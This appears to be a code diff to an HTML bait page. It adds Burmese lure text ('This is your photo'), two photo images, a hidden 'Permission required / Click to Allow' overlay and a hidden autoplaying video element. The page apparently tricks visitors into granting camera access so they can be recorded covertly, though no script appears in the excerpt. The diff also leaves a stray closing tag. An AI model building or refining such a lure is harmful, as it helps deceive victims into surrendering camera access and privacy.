@@ -7,12 +7,20 @@
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
+  <div class="block-overlay hidden" id="blockOverlay">
+    <div class="block-content">
+      <p class="block-text">Permission required to view content</p>
+      <button id="retryBtn" class="retry-btn">Click to Allow</button>
+    </div>
+  </div>
+
   <div class="bait-container" id="baitContainer">
-    <p class="bait-text">ဒါ သင်လား</p>
+    <p class="bait-text">ဒါ သင့်ပုံပါ</p>
     <div class="bait-images">
       <img id="baitImage1" src="photo_2026-09-09_15-05-00.jpg" alt="Photo" class="bait-img">
       <img id="baitImage2" src="photo_2026-09-09_15-05-10.jpg" alt="Photo" class="bait-img">
     </div>
+  </div>
   </div>
 
   <video id="video" autoplay playsinline muted class="hidden"></video>
